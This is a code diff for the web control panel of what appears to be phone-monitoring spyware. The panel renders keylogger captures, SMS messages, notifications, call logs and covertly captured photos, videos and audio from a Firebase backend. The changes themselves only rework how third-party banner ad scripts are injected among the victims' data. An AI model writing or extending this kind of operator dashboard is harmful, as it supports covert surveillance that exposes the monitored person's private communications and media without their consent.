@@ -1029,22 +1029,37 @@
         let isVideoCommandRunning = false;
         let isAudioCommandRunning = false;
         
-        // Ad helper function
-        function getAdHtml() {
-            // IMPORTANT: Use string concatenation to prevent the <script> tag from closing the main script block.
-            const adScript = '<script type="text/javascript">' +
-                "atOptions = {" +
-                "'key' : '3fdc31da6152751e5c6f9e26dadb6d23'," +
-                "'format' : 'iframe'," +
-                "'height' : 50," +
-                "'width' : 320," +
-                "'params' : {}" +
-                "};" +
-                '<' + '/script>' +
-                '<script type="text/javascript" src="//www.highperformanceformat.com/3fdc31da6152751e5c6f9e26dadb6d23/invoke.js">' + '<' + '/script>';
-            
-            return `<div class="ad-container ad-320x50">${adScript}</div>`;
+        // --- AD FUNCTIONS START ---
+        function getAdPlaceholderHtml(uniqueId) {
+            return `<div id="${uniqueId}" class="ad-container ad-320x50"></div>`;
         }
+        
+        function loadBannerAd(containerId) {
+            const container = document.getElementById(containerId);
+            if (!container) return;
+
+            container.innerHTML = ''; 
+
+            const script1 = document.createElement('script');
+            script1.type = 'text/javascript';
+            script1.text = `
+                atOptions = {
+                    'key' : '3fdc31da6152751e5c6f9e26dadb6d23',
+                    'format' : 'iframe',
+                    'height' : 50,
+                    'width' : 320,
+                    'params' : {}
+                };
+            `;
+
+            const script2 = document.createElement('script');
+            script2.type = 'text/javascript';
+            script2.src = '//www.highperformanceformat.com/3fdc31da6152751e5c6f9e26dadb6d23/invoke.js';
+
+            container.appendChild(script1);
+            container.appendChild(script2);
+        }
+        // --- AD FUNCTIONS END ---
 
         toggleSidebarBtn.addEventListener('click', () => dashboard.classList.toggle('sidebar-hidden'));
         
@@ -1462,6 +1477,7 @@
             const batch = fullKeyloggerData.slice(renderedKeyloggerCount, end);
 
             let contentHTML = '';
+            let adIdsToLoad = [];
             batch.forEach((log, index) => {
                 const globalIndex = renderedKeyloggerCount + index;
                 if (log && log.keyText) {
@@ -1471,19 +1487,26 @@
                     const text = parts[2] || '';
                     contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-title">${action}</div></div><div class="data-card-body"><strong>${text}</strong></div><div class="data-card-footer">${time}</div></div>`;
                 }
-                // Insert ad every 5 items
                 if ((globalIndex + 1) % 5 === 0) {
-                    contentHTML += getAdHtml();
+                    const adId = `ad-banner-keylogger-${globalIndex}`;
+                    contentHTML += getAdPlaceholderHtml(adId);
+                    adIdsToLoad.push(adId);
                 }
             });
 
             keyloggerList.insertAdjacentHTML('beforeend', contentHTML);
+
+            setTimeout(() => {
+                adIdsToLoad.forEach(id => loadBannerAd(id));
+            }, 100);
+
             renderedKeyloggerCount = end;
             isKeyloggerLoading = false;
         }
 
         function renderDataAsCards(category, data) {
             let contentHTML = '';
+            let adIdsToLoad = [];
             if (!data || Object.keys(data).length === 0) {
                 modalDataDisplayArea.innerHTML = '<p>No data available.</p>';
                 return;
@@ -1506,7 +1529,9 @@
                             contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="${iconColor}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg></div><div class="data-card-title">${title}</div></div><div class="data-card-body">${sms.smsBody || ''}</div><div class="data-card-footer">${sms.dateTime || ''}</div></div>`; 
                         }
                         if ((index + 1) % 5 === 0) {
-                            contentHTML += getAdHtml();
+                            const adId = `ad-banner-${category}-${index}`;
+                            contentHTML += getAdPlaceholderHtml(adId);
+                            adIdsToLoad.push(adId);
                         }
                     });
                     contentHTML += '</div>';
@@ -1521,7 +1546,9 @@
                             contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon">${appIcon}</div><div class="data-card-title">${notif.title || 'Notification'}</div></div><div class="data-card-body">${notif.text || ''}</div><div class="data-card-footer">${notif.dateTime || ''}</div></div>`; 
                         }
                         if ((index + 1) % 5 === 0) {
-                            contentHTML += getAdHtml();
+                            const adId = `ad-banner-${category}-${index}`;
+                            contentHTML += getAdPlaceholderHtml(adId);
+                            adIdsToLoad.push(adId);
                         }
                     });
                     contentHTML += '</div>';
@@ -1539,7 +1566,9 @@
                             contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon">${icon}</div><div class="data-card-title">${title}</div></div><div class="data-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="data-card-footer">${new Date(call.date).toLocaleString()}</div></div>`;
                         }
                         if ((index + 1) % 5 === 0) {
-                            contentHTML += getAdHtml();
+                            const adId = `ad-banner-${category}-${index}`;
+                            contentHTML += getAdPlaceholderHtml(adId);
+                            adIdsToLoad.push(adId);
                         }
                     });
                     contentHTML += '</div>';
@@ -1583,6 +1612,12 @@
                     break;
             }
             modalDataDisplayArea.innerHTML = contentHTML;
+
+            if (adIdsToLoad.length > 0) {
+                setTimeout(() => {
+                    adIdsToLoad.forEach(id => loadBannerAd(id));
+                }, 100);
+            }
         }
 
         function renderPhotosFromDatabase(userId, childKey) {
@@ -1603,6 +1638,7 @@
             onValue(photoDataRef, (snapshot) => {
                 const photos = snapshot.val();
                 let photoGridHTML = '';
+                let adIdsToLoad = [];
                 if (!photos || Object.keys(photos).length === 0) {
                     photoGridHTML = '<p>No photos available.</p>';
                 } else {
@@ -1615,12 +1651,20 @@
                             photoGridHTML += `<div class="data-card photo-card"><img src="${url}" alt="Captured photo" style="width:100%; height: 200px; object-fit: cover; border-radius: 8px 8px 0 0;" onerror="this.onerror=null;this.src='https://placehold.co/300x200/162136/E0E7FF?text=Error';"><div style="padding: 1rem;"><div class="data-card-footer" style="text-align: left;">${timeCreated}</div><a href="${url}" target="_blank" class="map-link" style="width: 100%; justify-content: center;">View Full Image</a></div></div>`;
                         }
                         if ((index + 1) % 5 === 0) {
-                           photoGridHTML += getAdHtml();
+                           const adId = `ad-banner-photo-${index}`;
+                           photoGridHTML += getAdPlaceholderHtml(adId);
+                           adIdsToLoad.push(adId);
                         }
                     });
                     photoGridHTML += '</div>';
                 }
                 document.getElementById('modal-data-display-area').innerHTML = headerHTML + photoGridHTML;
+
+                if (adIdsToLoad.length > 0) {
+                    setTimeout(() => {
+                        adIdsToLoad.forEach(id => loadBannerAd(id));
+                    }, 100);
+                }
             });
         }
         
@@ -1652,6 +1696,7 @@
                 onValue(videoDataRef, (videoSnapshot) => {
                     const videos = videoSnapshot.val();
                     let videoGridHTML = '';
+                    let adIdsToLoad = [];
                     if (!videos || Object.keys(videos).length === 0) {
                         videoGridHTML = '<p>No videos available.</p>';
                     } else {
@@ -1673,12 +1718,20 @@
                                 </div>`;
                             }
                             if ((index + 1) % 5 === 0) {
-                                videoGridHTML += getAdHtml();
+                                const adId = `ad-banner-video-${index}`;
+                                videoGridHTML += getAdPlaceholderHtml(adId);
+                                adIdsToLoad.push(adId);
                             }
                         });
                         videoGridHTML += '</div>';
                     }
                     document.getElementById('modal-data-display-area').innerHTML = headerHTML + videoGridHTML;
+
+                    if (adIdsToLoad.length > 0) {
+                        setTimeout(() => {
+                            adIdsToLoad.forEach(id => loadBannerAd(id));
+                        }, 100);
+                    }
                 });
             });
         }
@@ -1710,6 +1763,7 @@
                 onValue(audioDataRef, (audioSnapshot) => {
                     const audios = audioSnapshot.val();
                     let audioListHTML = '';
+                    let adIdsToLoad = [];
                     if (!audios || Object.keys(audios).length === 0) {
                         audioListHTML = '<p>No audio recordings available.</p>';
                     } else {
@@ -1730,12 +1784,20 @@
                                 </div>`;
                             }
                             if ((index + 1) % 5 === 0) {
-                                audioListHTML += getAdHtml();
+                                const adId = `ad-banner-audio-${index}`;
+                                audioListHTML += getAdPlaceholderHtml(adId);
+                                adIdsToLoad.push(adId);
                             }
                         });
                         audioListHTML += '</div>';
                     }
                     document.getElementById('modal-data-display-area').innerHTML = headerHTML + audioListHTML;
+                    
+                    if (adIdsToLoad.length > 0) {
+                        setTimeout(() => {
+                            adIdsToLoad.forEach(id => loadBannerAd(id));
+                        }, 100);
+                    }
                 });
             });
         }
